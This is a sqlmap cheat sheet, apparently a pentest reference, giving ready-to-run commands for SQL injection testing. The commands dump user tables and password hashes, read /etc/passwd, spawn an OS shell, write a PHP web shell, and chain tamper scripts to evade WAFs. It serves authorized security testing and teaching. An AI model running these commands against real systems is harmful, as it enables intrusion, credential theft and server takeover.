SQLmap

An automated detection and exploitation tool for SQL injection flaws across 9+ database engines (MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, and more). Covers fingerprinting, schema mapping, data extraction, out-of-band takeover, and WAF evasion.

MySQL PostgreSQL MSSQL Oracle --technique=BEU OS Shell Tamper Scripts Burp Integration
First 3 Commands — Quick Start
Fast, calibrated commands covering 90% of automated SQL injection audits.
$ sqlmap -u "https://target/page?id=1" --batch --dbs Detect & list databases
$ sqlmap -r request.txt -p id --batch --level=3 --risk=2 Test from Burp request file
$ sqlmap -u "https://target/page?id=1" --technique=BEU --batch Fast & safe technique selection
Why is SQLmap failing (or taking forever)? — The --risk and --level traps.
  • --risk=3 is destructive: Level 1 (default) avoids data changes. Level 2 adds heavy time-based queries. Level 3 adds OR-based payloads that can alter or delete data in live tables (e.g. UPDATE/DELETE ... WHERE OR 1=1). Never use --risk=3 on production without explicit written authorization.
  • --level=5 is slow, not smarter: Higher levels test more injection locations (Level 2 adds HTTP Cookie, Level 3 adds User-Agent and Referer, Level 5 adds Host header) but do not increase payload sophistication. Start at level 1; only raise if you suspect a non-standard injection vector.
  • Default blind injection is painfully slow: If the target only discloses data via time-based blind queries, SQLmap's default single-thread and 5-second sleep checks take hours or time out. Accelerate extraction with --threads=10 and calibrate with --time-sec=2 (lowering baseline sleep from 5s to 2s).
  • WAFs cause silent false negatives: When a WAF drops or resets SQLmap's signature payloads, SQLmap will report "all tested parameters do not appear to be injectable" even when an injection flaw is present. Always test with --random-agent and targeted --tamper scripts before concluding a parameter is secure.
Manual validation first, automation second. SQLmap is an automated extraction engine, not a substitute for manual testing. Its default traffic signature is aggressively fingerprinted by intrusion detection systems. Always manually prove parameter reflection (using a single quote ', arithmetic expressions 2-1, or a boolean test AND 1=1) before launching automation. Point SQLmap directly at the verified parameter with -p to prevent unnecessary scan noise.

Detection & Techniques

Standard GET and POST parameter detection
Probe query string parameters or form data bodies in batch mode without interactive prompts.
$ sqlmap -u "https://target/page?id=1" --batch
$ sqlmap -u "https://target/login" --data "user=admin&pass=test" --batch
Testing from a saved Burp Suite request file
Replay complex authenticated requests with session cookies, custom headers, and multi-part bodies.
$ sqlmap -r request.txt -p id --batch
Critical Rule: Always specify -p <parameter>. Without -p, SQLmap tests every header and parameter in the request, drastically slowing down execution and triggering WAF rate limits.
Technique selection (--technique=BEUSTQ)
Restrict attack modes to prioritize speed, avoid timeouts, and prevent unintended data modification.
LetterTechniqueOperational Characteristics
BBoolean-based blindSlow bit-by-bit extraction; safe on production
EError-basedFast extraction using DB runtime error messages
UUNION query-basedFastest technique; reflects data directly in HTTP response
SStacked queriesExecutes multiple queries (can modify data; use with caution)
TTime-based blindExtremely slow delay queries; fallback when all else fails
QInline queriesSubqueries inside SQL statements (rare in modern apps)
$ sqlmap -u "https://target/page?id=1" --technique=BEU --batch Fast & safe (no time delays, no stacked queries)
$ sqlmap -u "https://target/page?id=1" --technique=U --batch UNION-only (instant speed on CTFs & vulnerable endpoints)
Warning: Stacked queries (S) can execute INSERT, UPDATE, and DELETE. Never enable stacked queries on production targets without authorization.

Database Enumeration

Enumerate databases → tables → columns
Progressive discovery of the target database architecture and schema hierarchy.
$ sqlmap -u "https://target/page?id=1" --dbs List all accessible database names
$ sqlmap -u "https://target/page?id=1" -D app_db --tables List tables inside database app_db
$ sqlmap -u "https://target/page?id=1" -D app_db -T users --columns List column names and data types
Enumerate DBMS version, current user, and DBA privileges
Assess administrative rights to determine if file access or OS execution is viable.
$ sqlmap -u "https://target/page?id=1" --banner Retrieve exact DBMS version banner
$ sqlmap -u "https://target/page?id=1" --current-user --is-dba Check if current session user is DBA
$ sqlmap -u "https://target/page?id=1" --current-db --hostname Current active database and system hostname
$ sqlmap -u "https://target/page?id=1" --users --passwords Enumerate DB user accounts and password hashes

Data Dumping & Exfiltration

Dumping optimization tips: When dumping large production tables, always use --start=1 --stop=100 to limit row extraction. Add --hex if table fields contain binary data or special characters that corrupt terminal rendering. Use --threads=5 to accelerate extraction without triggering database locking (do not exceed 10).
Dump specific table data with row constraints
Extract specific rows and columns rather than pulling the entire database.
$ sqlmap -u "https://target/page?id=1" -D app_db -T users --dump
$ sqlmap -u "https://target/page?id=1" -D app_db -T users -C "username,password" --start=1 --stop=50 --dump
Dump full database schema without table contents
Quickly map the complete structure of all databases without transferring sensitive customer rows.
$ sqlmap -u "https://target/page?id=1" --schema --batch
$ sqlmap -u "https://target/page?id=1" -D app_db --dump-all --exclude-sysdbs

OS Shell & File Access (Prerequisites & Execution)

Before you run --os-shell: Mandatory 3-Point Checklist
Why --os-shell fails on 90% of modern targets without explicit database configuration prerequisites.
  1. Database user privileges: The connected database user must possess the FILE privilege (and ideally SUPER or DBA status). Verify via:
    $ sqlmap -u "https://target/page?id=1" --privileges
  2. MySQL secure_file_priv restriction: In modern MySQL/MariaDB setups, file I/O is governed by secure_file_priv. If set to NULL, file writing is completely blocked. If set to a directory path (e.g. /var/lib/mysql-files/), files can only be created inside that specific path. Test via:
    $ sqlmap -u "https://target/page?id=1" --sql-query="SELECT @@secure_file_priv"
  3. Writable web directory path: SQLmap must write a stager/backdoor file into the document root of the web server (e.g. /var/www/html/, C:\inetpub\wwwroot\). Obtain this path from error disclosures, phpinfo, or file reads.
Interactive OS shell & one-off command execution
Spawn a pseudo-interactive shell or dispatch single commands through database UDF or web backdoor injection.
$ sqlmap -u "https://target/page?id=1" --os-shell
$ sqlmap -u "https://target/page?id=1" --os-cmd="whoami"
Arbitrary file read and remote file write
Extract configuration files or upload persistent web shells via the backend DBMS filesystem APIs.
$ sqlmap -u "https://target/page?id=1" --file-read="/etc/passwd"
$ sqlmap -u "https://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

Tamper Scripts (WAF Bypass & Chaining)

Tamper ScriptObfuscation MechanismTargeted Filter
space2commentReplaces space characters with inline comments (/**/)Standard space filters

Chaining tamper scripts for modern WAFs (Cloudflare, AWS WAF, ModSecurity)
Layer multiple obfuscation transformations in pipeline order to slip past multi-stage WAF inspection.
$ sqlmap -u "https://target/page?id=1" --tamper=space2comment,randomcase Basic 2-layer evasion combo
$ sqlmap -u "https://target/page?id=1" --tamper=space2comment,randomcase,equaltolike Intermediate 3-layer combo
$ sqlmap -u "https://target/page?id=1" --tamper=space2comment,between,charencode,randomcase Aggressive 4-layer combo
Evasion Rule: More tamper scripts are not always better. Each transformation adds processing overhead and may corrupt query syntax. Start with 1–2 scripts, verify positive response feedback, and layer additional scripts incrementally.
